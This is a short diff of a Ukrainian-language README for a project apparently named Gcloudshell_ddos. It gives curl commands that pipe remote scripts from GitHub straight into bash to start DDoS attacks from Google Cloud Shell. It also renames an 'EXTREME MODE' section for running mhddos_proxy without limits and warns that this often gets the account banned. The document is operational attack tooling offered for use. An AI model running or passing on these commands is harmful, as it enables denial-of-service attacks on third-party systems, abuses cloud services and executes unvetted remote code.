@@ -42,7 +42,7 @@ curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_dualShell.sh | bash
 ```    
 #
-### EXTREME MODE:zap: Команди без обмежень
+### EXTREME MODE:zap:NoLimits (команди mhddos_proxy без параметрів)
  :exclamation: **Атаки виходять потужні але короткі + висока ймовірність отримати бан** (*бан зазвичай тимчасовий і стосується тільки доступу до GShell*)    
   
 :zap:***--itarmy*:**
